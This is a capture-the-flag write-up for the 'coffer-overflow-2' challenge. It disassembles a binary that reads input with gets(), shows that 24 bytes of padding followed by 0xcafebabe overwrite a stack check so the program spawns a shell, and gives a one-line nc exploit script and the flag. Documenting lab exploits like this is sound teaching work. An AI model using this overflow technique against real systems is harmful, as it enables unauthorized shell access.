# coffer-overflow-2

# Description

NotDeGhost

The coffers keep getting stronger! You'll need to use the source, Luke.

# Solution

We're given a binary and its source code.
Disassembling the binary gives us the following:

```asm
[0x00400590]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400590]> afl
0x00400590    1 42           entry0
0x004005d0    4 42   -> 37   sym.deregister_tm_clones
0x00400600    4 58   -> 55   sym.register_tm_clones
0x00400640    3 34   -> 29   sym.__do_global_dtors_aux
0x00400670    1 7            entry.init0
0x00400780    1 2            sym.__libc_csu_fini
0x00400784    1 9            sym._fini
0x00400710    4 101          sym.__libc_csu_init
0x004005c0    1 2            sym._dl_relocate_static_pie
0x00400677    3 147          main
0x00400560    1 6            sym.imp.setbuf
0x00400550    1 6            sym.imp.puts
0x00400580    1 6            sym.imp.gets
0x00400570    1 6            sym.imp.system
0x00400528    3 23           sym._init
[0x00400590]> pdf @main
            ; DATA XREF from entry0 @ 0x4005ad
┌ 147: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x20
│           ; var uint32_t var_8h @ rbp-0x8
│           0x00400677      55             push rbp
│           0x00400678      4889e5         mov rbp, rsp
│           0x0040067b      4883ec20       sub rsp, 0x20
│           0x0040067f      48c745f80000.  mov qword [var_8h], 0
│           0x00400687      488b05d20920.  mov rax, qword [obj.stdout] ; obj.stdout__GLIBC_2.2.5
│                                                                      ; [0x601060:8]=0
│           0x0040068e      be00000000     mov esi, 0                  ; char *buf
│           0x00400693      4889c7         mov rdi, rax                ; FILE *stream
│           0x00400696      e8c5feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x0040069b      488b05ce0920.  mov rax, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
│                                                                      ; [0x601070:8]=0
│           0x004006a2      be00000000     mov esi, 0                  ; char *buf
│           0x004006a7      4889c7         mov rdi, rax                ; FILE *stream
│           0x004006aa      e8b1feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x004006af      488b05ca0920.  mov rax, qword [obj.stderr] ; obj.stderr__GLIBC_2.2.5
│                                                                      ; [0x601080:8]=0
│           0x004006b6      be00000000     mov esi, 0                  ; char *buf
│           0x004006bb      4889c7         mov rdi, rax                ; FILE *stream
│           0x004006be      e89dfeffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x004006c3      488d3dce0000.  lea rdi, str.Welcome_to_coffer_overflow__where_our_coffers_are_overfilling_with_bytes ; 0x400798 ; "Welcome to coffer overflow, where our coffers are overfilling with bytes ;)" ; const char *s
│           0x004006ca      e881feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006cf      488d3d120100.  lea rdi, str.What_do_you_want_to_fill_your_coffer_with ; 0x4007e8 ; "What do you want to fill your coffer with?" ; const char *s
│           0x004006d6      e875feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004006db      488d45e0       lea rax, [s]
│           0x004006df      4889c7         mov rdi, rax                ; char *s
│           0x004006e2      e899feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004006e7      b8bebafeca     mov eax, 0xcafebabe
│           0x004006ec      483945f8       cmp qword [var_8h], rax
│       ┌─< 0x004006f0      7511           jne 0x400703
│       │   0x004006f2      488d3d1a0100.  lea rdi, str.bin_sh         ; 0x400813 ; "/bin/sh" ; const char *string
│       │   0x004006f9      b800000000     mov eax, 0
│       │   0x004006fe      e86dfeffff     call sym.imp.system         ; int system(const char *string)
│       │   ; CODE XREF from main @ 0x4006f0
│       └─> 0x00400703      b800000000     mov eax, 0
│           0x00400708      c9             leave
└           0x00400709      c3             ret
[0x00400590]>
```

This program is quite similar to the one in coffer-overflow-0, however, there is one key difference.

Rather than jumping past the call to `system` if the variables are equal, here the jump is made if they are not equal.
This means that `qword [var_8h]` and `rax` must be equal to spawn a shell.

This is an issue as the variable `[var_8h]` is set to 0 at the start of the program.

```asm
0x0040067f      48c745f80000.  mov qword [var_8h], 0
```

Whereas `rax` is set to 0xcafebabe.

```asm
0x004006e7      b8bebafeca     mov eax, 0xcafebabe
```

(Recall that `eax` is a subdivision of `rax`).

However, we can use the same technique to overwrite `[var_8h]` to the correct value.

The difference between the address of `s`, which stores the output of `gets`, and `[var_8h]` is the same as in the previous challenge, which is 24 bytes.

```asm
; var char *s @ rbp-0x20
; var uint32_t var_8h @ rbp-0x8
```

Therefore, our payload consists of 24 bytes of padding, followed by 0xcafebabe, converted to little endian.

Once again, `cat` is used to redirect `stdin` to `stdout` and allow us to interact with the newly spawned shell.

## Exploit Script

```
#!/bin/bash

(echo -e AAAAAAAAAAAAAAAAAAAAAAAA'\xbe\xba\xfe\xca'; cat) | nc 2020.redpwnc.tf 31255
```

## Flag

```flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}```

